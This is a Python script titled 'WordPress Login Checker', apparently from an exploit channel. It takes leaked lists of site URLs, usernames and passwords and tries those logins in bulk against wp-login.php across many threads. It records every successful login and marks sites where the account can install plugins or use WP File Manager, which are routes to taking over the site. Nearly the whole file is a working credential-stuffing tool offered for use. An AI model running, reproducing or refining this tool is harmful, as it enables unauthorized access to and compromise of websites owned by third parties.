import requests, re, sys, os
from colorama import Fore, init
from multiprocessing.dummy import Pool
from html import unescape

def create_folders():
    paths = ["./Success"]
    for path in paths:
        if not os.path.exists(path):
            os.makedirs(path)

init(autoreset=True)
requests.packages.urllib3.disable_warnings()
fr = Fore.LIGHTRED_EX
fw = Fore.LIGHTWHITE_EX
fg = Fore.LIGHTGREEN_EX

print(Fore.LIGHTMAGENTA_EX + r'''
                 _..__
                .' I   '.
                |.-"""-.|
               _;.-"""-.;_
           _.-' _..-.-.._ '-._
          ';--.-(_o_I_o_)-.--;'
           `. | |  | |  | | .`
             `-\|  | |  |/-'
                |  | |  |
                |  \_/  |
             _.'; ._._. ;'._
        _.-'`; | \  -  / | ;'-.
      .' :  /  |  |   |  |  \  '.
     /   : /__ \  \___/  / __\ : `.
    /    |   /  '._/_\_.'  \   :   `\
   /     .  `---;"""""'-----`  .     \
  /      |      |()    ()      |      \
 /      /|      |              |\      \    ''' + Fore.LIGHTWHITE_EX + 'WordPress Login Checker\n' +
Fore.LIGHTMAGENTA_EX + r'''/      / |      |()    ()      | \      \    ''' + Fore.LIGHTGREEN_EX + 'Version: Final\n' +
Fore.LIGHTBLACK_EX + '                                              Channel @StableExploit | Coded : @LetMeSeeHaha\n')

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'referer': 'https://www.google.com'
}

def normalize_url(site):
    site = str(site)
    if site.startswith('http://'):
        site = site.replace('http://', '')
        p = 'http://'
    elif site.startswith('https://'):
        site = site.replace('https://', '')
        p = 'https://'
    else:
        p = 'http://'
    if '/' in site:
        site = site.rstrip().split('/')[0]
    return '{}{}'.format(p, site)

def user_input(prompt):
    try:
        if sys.version_info[0] < 3:
            return raw_input(prompt).strip()
        else:
            sys.stdout.write(prompt)
            return input().strip()
    except:
        return ''

def extract_base_url(panel):
    try:
        paths = ['/wp-login.php', '/admin', '/user']
        for path in paths:
            if path in panel:
                return re.findall(re.compile('(.*){}'.format(path)), panel)[0]
        return panel
    except:
        return panel

def get_response_text(response):
    try:
        return response.content.decode('utf-8', errors='ignore')
    except:
        return response.text

def try_wp_login(url, username, password):
    try:
        while url.endswith('/'):
            url = url[:-1]
        session = requests.session()
        url = url.replace("/wp-login.php#", "").replace("/wp-login.php", "")

        login_headers = headers.copy()
        login_headers['referer'] = f'{url}/wp-admin/'

        login_data = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'redirect_to': f'{url}/wp-admin/'
        }

        response = session.post(f'{url}/wp-login.php', data=login_data, headers=login_headers, verify=False, timeout=15)
        if normalize_url(response.url) != normalize_url(url):
            url = extract_base_url(response.url)
            session = requests.session()
            response = session.post(f'{url}/wp-login.php', data=login_data, headers=login_headers, verify=False, timeout=15)

        content = get_response_text(response)

        if 'wp-admin/profile.php' in content or 'wp-admin/upgrade.php' in content:
            with open('./Success/Login-Success.txt', 'a', encoding='utf-8') as f:
                f.write(f'{url}/wp-login.php#{username}@{password}\n')
            print(f'-> {fg}{url} - Success')

            dashboard = get_response_text(session.get(f'{url}/wp-admin/', headers=headers, verify=False, timeout=15))

            if "plugin-install.php" in dashboard:
                with open('./Success/Wp-Plugin-Install.txt', 'a', encoding='utf-8') as f:
                    f.write(f'{url}/wp-login.php#{username}@{password}\n')
                print(f'-> {Fore.LIGHTCYAN_EX}{url} - Wp-Plugin-Install')

            if 'WP File Manager' in dashboard:
                with open('./Success/Wp-Filemanager.txt', 'a', encoding='utf-8') as f:
                    f.write(f'{url}/wp-login.php#{username}@{password}\n')
                print(f'-> {Fore.LIGHTYELLOW_EX}{url} - Wp-File-Manager')
        else:
            print(f'-> {fr}{url} - Failed')

    except Exception as e:
        print(f'-> {fr}{url} - Error: {str(e)}')

def parse_login_format(line):
    try:
        if "#" in line and "@" in line:
            url, _, user_pass = line.partition("#")
            user, _, password = user_pass.partition("@")
        elif line.count(":") == 2 and "http" not in line:
            url, user, password = line.split(":")
            url = "https://" + url
        else:
            return '', '', ''
        return url, user, password
    except:
        return '', '', ''

def process_login(entry):
    try:
        url, username, password = parse_login_format(entry)
        if url and username and password:
            try_wp_login(url, username, password)
    except:
        pass

if __name__ == "__main__":
    create_folders()

    try:
        files = [f for f in os.listdir('.') if os.path.isfile(f) and f.lower().endswith('.txt')]
        print("\nAvailable .txt files in current folder:")
        for idx, file in enumerate(files):
            print(f"[{idx+1}] {file}")
        file_index = int(user_input("\nEnter file number to use: ")) - 1
        filename = files[file_index]
    except (IndexError, ValueError):
        print(f"{fr}[-] Invalid selection.")
        sys.exit(1)

    try:
        threads = int(user_input("Enter number of threads (e.g. 50 or 100): "))
    except:
        threads = 50

    if not os.path.isfile(filename):
        print(f"{fr}[-] File not found or invalid path: {filename}")
        sys.exit(1)

    with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
        lines = [line.strip() for line in f if line.strip()]

    if not lines:
        print(f"{fr}[-] Your file is empty.")
        sys.exit(1)

    print(f"{Fore.LIGHTBLUE_EX}[~] Total sites loaded: {len(lines)}")

    mp = Pool(threads)
    mp.map(process_login, lines)
